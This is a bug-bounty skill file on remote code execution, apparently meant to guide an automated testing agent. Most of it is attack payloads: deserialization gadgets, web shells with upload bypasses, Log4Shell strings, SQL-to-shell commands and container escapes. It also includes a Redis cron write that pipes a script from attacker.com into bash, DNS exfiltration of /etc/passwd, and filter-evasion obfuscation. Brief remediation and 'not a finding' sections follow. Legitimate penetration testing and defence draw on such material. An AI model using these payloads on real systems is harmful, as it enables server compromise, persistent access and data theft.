---
name: "remote-code-execution"
version: "2.0"
category: "injection"
subcategory: "rce"
phase: "exploitation"
tags: ["bug-bounty", "command-injection", "deserialization", "file-upload", "injection", "log4shell", "rce", "access-control", "account-takeover", "api", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["ysoserial", "ysoserial.net", "commix", "nuclei", "interactsh", "adb", "burp", "ghauri", "sqlmap", "metasploit", "msfvenom", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["command-injection", "ssti", "ssrf", "xxe", "exploitation-chaining", "information-disclosure-harvesting", "bug-bounty-reporting"]
prerequisite_skills: ["sqli", "ssti", "lfi", "ssrf"]
description: "Bug bounty skill: remote code execution - exploitation phase, injection category"
---
# Remote Code Execution (RCE)

## Summary

Remote Code Execution occurs when an attacker can execute arbitrary code on a target machine via a vulnerability or misconfiguration. This is the highest-severity class of vulnerability — it often leads to full server compromise, data exfiltration, lateral movement, and persistent access. RCE can be achieved through many attack paths: command injection, SSTI, deserialization, file upload chains, SQL injection, SSRF→RCE, Log4Shell, prototype pollution, container escape, and chaining multiple lower-severity bugs.

## Key Concepts

- **Code Injection**: User input passed to `eval()`, `exec()`, `Function()`, or similar — most direct RCE path
- **Command Injection**: Untrusted data flows into OS command execution APIs (`system()`, `subprocess.run(shell=True)`)
- **Deserialization RCE**: Deserializing untrusted data triggers gadget chains to code execution (Java, .NET, Python pickle)
- **File Upload → RCE**: Uploading malicious files (web shells, ZIP bombs, ImageMagick exploits) via processing pipelines
- **SQL → RCE**: Database features like `INTO OUTFILE`, `xp_cmdshell`, `COPY FROM PROGRAM` for code execution
- **Container Escape**: Breaking out of Docker/containerd via mounted sockets, privileged mode, or kernel exploits
- **Chaining**: Combining low/medium severity bugs (SSRF + internal admin, path traversal + cron overwrite, XXE + SSRF) into full RCE

## Technical Details

### Deserialization RCE

#### Java (ysoserial)

```bash
# Generate payload
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/beacon' | base64

# Popular gadget chains
ysoserial CommonsCollections1
ysoserial CommonsCollections6
ysoserial CommonsCollections7
ysoserial Spring1
ysoserial Spring2
ysoserial Jdk7u21
ysoserial Hibernate1
```

#### .NET (ysoserial.net)

```bash
ysoserial.exe -g ObjectDataProvider -f Json -c "calc.exe"
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell.exe -c whoami"

# Gadgets
TypeConfuseDelegate  ObjectDataProvider  PSObject  WindowsIdentity
```

#### Python pickle

```python
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ('whoami',))

payload = pickle.dumps(RCE())
print(base64.b64encode(payload))
```

#### PHP serialize

Magic methods targeted: `__wakeup()`, `__destruct()`, `__toString()`

```
O:8:"stdClass":1:{s:4:"file";s:17:"/etc/passwd";}
```

### File Upload → RCE

#### Web Shell Upload

**PHP:**
```php
<?php system($_GET['c']); ?>
```

Bypass extension filters:
```
shell.php.jpg        shell.php%00.jpg     shell.php%0a.jpg
shell.php.....       shell.pHp            shell.php%20
shell.php::$DATA     shell.php/
```

**Content-Type manipulation:**
```
Content-Type: image/jpeg
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
```

**Polyglot files:**
```
GIF89a<?php system($_GET['c']); ?>
```

**ExifTool polyglot (valid image + PHP in metadata):** bypasses magic-byte/content checks that accept the file as a real image:
```bash
exiftool -Comment="<?php echo system($_GET['c']); ?>" input-image.jpg -o shell.php
```

**Reverse double extension:** Apache configs that match a pattern anywhere in the filename can execute mislabeled files — `shell.php.jpg` bypasses whitelist checks yet executes if the server has an improperly terminated handler config:
```apache
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

**Upload path discovery:** after upload, fuzz for the storage directory with ffuf — `/uploads`, `/profile_images`, `/avatars` are common defaults:
```bash
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -t 64
curl -s 'http://target/uploads/shell.php?cmd=id'
```

**ASP:**
```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<% Process.Start("cmd.exe", "/c " + Request["c"]); %>
```

**JSP:**
```jsp
<% Runtime.getRuntime().exec(request.getParameter("c")); %>
```

#### .htaccess / web.config Injection

**.htaccess to enable PHP in images:**
```apache
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**web.config to enable ASP in images:**
```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="jpg" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory" />
    </handlers>
  </system.webServer>
</configuration>
```

#### Archive Extraction (Zip Slip - CVE-2018-1002200)

```bash
ln -s ../../../../../../../etc/cron.d/evil evil.txt
zip --symlinks evil.zip evil.txt
```

Upload zip/tar containing paths with `../` to overwrite cron jobs, SSH keys, web roots.

#### ImageMagick Exploits

**ImageTragick (CVE-2016-3714):**
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://attacker.com/shell.jpg"|whoami")'
pop graphic-context
```

**Arbitrary file read (CVE-2022-44268):**
```bash
convert -size 1x1 xc:red -set "profile:1" "/etc/passwd" exploit.png
convert exploit.png output.png
identify -verbose output.png | grep "Raw profile type"
```

**Other vectors:** MSL injection, label injection, SVG with embedded scripts.

#### PDF Processing RCE

**JavaScript in PDF:**
```javascript
app.alert({ cMsg: "XSS", cTitle: "XSS" });
this.exportDataObject({ cName: "test", nLaunch: 2 });
```

**LaTeX Injection:**
```latex
\documentclass{article}
\immediate\write18{whoami}
\begin{document}Hello World\end{document}
\input{|"whoami"}
```

**XSL-FO Injection (Apache FOP):**
```xml
<fo:instream-foreign-object>
  <svg:svg>
    <svg:script>java.lang.Runtime.getRuntime().exec("whoami")</svg:script>
  </svg:svg>
</fo:instream-foreign-object>
```

#### Office Document Processing

**XXE in DOCX/XLSX:**
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

**Macro-enabled Documents:** DOCM, XLSM, PPTM with VBA macros. Excel 4.0 (XLM) macros bypass modern protections. DDE injection.

### Log4Shell (CVE-2021-44228)

**Basic payloads:**
```bash
${jndi:ldap://attacker.com/a}
${jndi:rmi://attacker.com/a}
${jndi:dns://attacker.com/a}
```

Common injection points: `User-Agent`, `X-Api-Version`, `Referer`.

**Obfuscation bypasses:**
```bash
${${lower:j}ndi:ldap://attacker.com/a}
${j${env:NOTHING:-n}di:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

**Setup LDAP server for exploitation:**
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com/#Exploit" 1389
```

Exploit.java — compile and host:
```java
public class Exploit {
    static { Runtime.getRuntime().exec("curl http://attacker.com/pwned"); }
}
```

### FFmpeg / ExifTool Exploits

**FFmpeg SSRF (CVE-2016-1897, CVE-2016-1898):**
```
concat:http://attacker.com/playlist|file:///etc/passwd
```

**ExifTool RCE (CVE-2021-22204):**
```bash
exiftool -config exploit.config '-HasselbladExif<=exploit.jpg' malicious.jpg
```

### SQL Injection → RCE

**MySQL:**
```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
LOAD_FILE('/etc/passwd');
CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('whoami');
```

**PostgreSQL:**
```sql
COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/beacon';
SELECT lo_export(-1, '/var/www/html/shell.php');
```

**MSSQL:**
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';

EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami';
```

### Container Escape → RCE

**Docker Socket Exposure:**
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh
```

**Privileged Container:**
```bash
mkdir /tmp/exploit
mount /dev/sda1 /tmp/exploit
chroot /tmp/exploit sh
```

**Kernel Exploits:** Dirty COW (CVE-2016-5195), DirtyPipe (CVE-2022-0847), DirtyCred (CVE-2022-2588).

### Prototype Pollution → RCE

Pollute the Object prototype to inject options into child processes. (See `Prototype_Pollution.md` for basics.)

```javascript
{"__proto__": {"shell": "/bin/sh", "argv0": "console.log(require('child_process').execSync('whoami').toString())//"}}
{"__proto__": {"NODE_OPTIONS": "--require /tmp/malicious.js"}}
```

CVE-2022-21824 — Prototype pollution in Node.js VM module.

## Chaining and Escalation

| Path | Description |
|------|-------------|
| Path Traversal → RCE | Overwrite `~/.ssh/authorized_keys`, `/etc/cron.d/backdoor`, `.bashrc`, `.user.ini` |
| SSRF → RCE | SSRF to cloud metadata for IAM creds, SSRF to internal admin panel for exec, SSRF to Redis for cron job write |
| XXE → RCE | XXE + PHP expect wrapper (`expect://whoami`), XXE + JAR protocol (Java) |
| SSTI → File Write → RCE | Jinja2 write shell: `{{''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET["c"]); ?>')}}` |

### SSRF → Redis → Cron

```bash
http://localhost:6379
CONFIG SET dir /etc/cron.d/
CONFIG SET dbfilename root
SET 1 "* * * * * root curl http://attacker.com/shell.sh | bash"
SAVE
```

### Path Traversal Overwrites

```bash
PUT /upload?path=../../.ssh/authorized_keys
PUT /upload?path=../../etc/cron.d/backdoor
PUT /upload?path=../../.bashrc
PUT /upload?path=../../.user.ini
Content: auto_prepend_file=/tmp/shell.php
```

## Detection Commands

### Blind RCE

```bash
# Time-based
; sleep 10
| ping -c 10 127.0.0.1
& timeout /t 10

# OAST DNS
; nslookup $(whoami).burpcollaborator.net
; dig $(whoami).burpcollaborator.net

# OAST HTTP
; curl http://burpcollaborator.net/$(whoami)
; wget http://burpcollaborator.net/$(whoami)

# Data exfiltration via DNS
; cat /etc/passwd | base64 | xargs -I {} nslookup {}.burpcollaborator.net
```

### Safe Confirmation

```bash
whoami
id
pwd
hostname
echo "pwned_by_researcher" > /tmp/proof.txt
```

## Tools

- **SSTI**: `tplmap`, `SSTImap`
- **Deserialization**: `ysoserial` (Java), `ysoserial.net` (.NET), `marshalsec` (JNDI)
- **Command Injection**: `commix`, Burp Intruder
- **General**: Burp ActiveScan, `nuclei` templates, `jaeles`
- **OAST**: Burp Collaborator, Interactsh, canarytokens.org

## Bypass Techniques

### Command Obfuscation

```bash
# Wildcard injection
/???/??t /???/??ss??

# Quotes
c''at /etc/passwd
c\at /etc/passwd
c"a"t /etc/passwd

# Variable expansion
a=w;b=hoami;$a$b

# Base64 execution
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Hex encoding
\x77\x68\x6f\x61\x6d\x69
wh\u006fami

# Space bypasses
cat</etc/passwd
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Line continuation
wh\
oami

# Comments in command
wh#comment
oami
```

### Expression Language Bypasses

Split keywords to evade filters:
```java
${T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(...)}
```

### Log4Shell Obfuscation

```bash
${${lower:j}ndi:ldap://attacker.com/a}
${j${env:NOTHING:-n}di:ldap://attacker.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
```

## Not a Finding If

- `allow_url_include = Off` blocks `data://` and `php://input` wrappers, but `php://filter` may still work for file reads.
- `shell=False` in Python subprocess or `execFile` in Node.js prevents shell metacharacter injection (but argument injection via leading `-` may still work).
- Deserialization without known gadget chains on the classpath is not exploitable.
- IMDSv2 on AWS requires a two-step token; blind `GET /latest/meta-data/` returns empty.
- Container with seccomp/apparmor restrictions may block kernel exploit primitives.
- `xp_cmdshell` is disabled by default in MSSQL 2005+.

## Remediation Recommendations

- Eliminate dangerous functions: `eval`, `exec`, `Function`, `subprocess.shell=True`, `Runtime.exec()` where possible.
- Use parameterized/array-based execution (`shell=False`); escape and allowlist arguments.
- Enforce content-type AND extension checks on uploads; re-encode/reprocess files; strip metadata; store outside web root.
- Process uploads in isolated containers with seccomp/AppArmor/SELinux, no network, as non-root.
- Prefer JSON/XML with strict schemas over native serialization; sign serialized data; avoid `pickle`, `marshal`.
- Update libraries (ImageMagick, ExifTool, FFmpeg, Log4j) and audit dependencies.
- Implement egress filtering to block OAST callbacks.
- Set `log4j2.formatMsgNoLookups=true` or remove JndiLookup class from classpath.
- Deploy WAF with RCE signatures and consider RASP.

## Real-World CVEs

| CVE | Affected | Impact |
|-----|----------|--------|
| CVE-2021-44228 | Log4Shell — Apache Log4j | Unauthenticated RCE on millions of systems |
| CVE-2022-22965 | Spring4Shell — Spring Framework | RCE via class loader manipulation |
| CVE-2021-3129 | Laravel Debug Mode — Ignition | Unauthenticated RCE on debug-enabled Laravel |
| CVE-2019-0193 | Apache Solr — Velocity template | Unauthenticated RCE |
| CVE-2017-5638 | Apache Struts2 — OGNL injection | RCE via Content-Type (Equifax breach) |
| CVE-2020-1938 | Ghostcat — Apache Tomcat AJP | RCE via file write |
| CVE-2022-26134 | Confluence — OGNL injection | Unauthenticated RCE |
| CVE-2016-3714 | ImageTragick — ImageMagick | RCE on image upload |
| CVE-2021-22204 | ExifTool — DjVu metadata | RCE via image metadata |
| CVE-2018-1002200 | Zip Slip — Archive extraction | Container escape via kubectl cp |
| CVE-2022-21824 | Node.js VM — Prototype pollution | RCE via VM module pollution |

## References

- https://portswigger.net/web-security/os-command-injection
- https://portswigger.net/web-security/server-side-template-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/RCE%20-%20Remote%20Code%20Execution
- https://book.hacktricks.xyz/pentesting-web/rce-remote-code-execution
- https://github.com/frohoff/ysoserial
- https://github.com/pwntester/ysoserial.net
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security
